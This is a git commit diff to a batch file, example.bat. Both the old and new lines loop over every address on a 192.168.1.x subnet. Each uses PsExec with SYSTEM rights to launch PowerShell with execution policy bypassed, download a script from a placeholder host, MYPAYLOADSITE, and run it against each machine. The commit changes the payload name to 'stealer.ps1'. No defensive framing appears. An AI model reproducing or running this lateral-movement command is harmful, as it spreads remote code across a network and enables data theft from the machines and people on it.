c97618b98b3f2660625fd6805367f2a052f51855
Hakan Yavuz <lodos05@gmail.com>
2020-09-06 16:44:25 +0300

    Update example.bat

--- example.bat
+++ example.bat
@@ -1,1 +1,1 @@
-FOR /L %%G IN (1,1,255) DO PsExec.exe \\192.168.1.%%G -n 5 -accepteula -s powershell.exe -exec bypass -C "(new-object net.webclient).DownloadFile('http://MYPAYLOADSITE/iis.txt','local.ps1');./local.ps1 \\MYSERVER\paylasim 192.168.1.%%G"
+FOR /L %%G IN (1,1,255) DO PsExec.exe \\192.168.1.%%G -n 5 -accepteula -s powershell.exe -exec bypass -C "(new-object net.webclient).DownloadFile('http://MYPAYLOADSITE/stealer.ps1','local.ps1');./local.ps1 \\MYSERVER\paylasim 192.168.1.%%G"
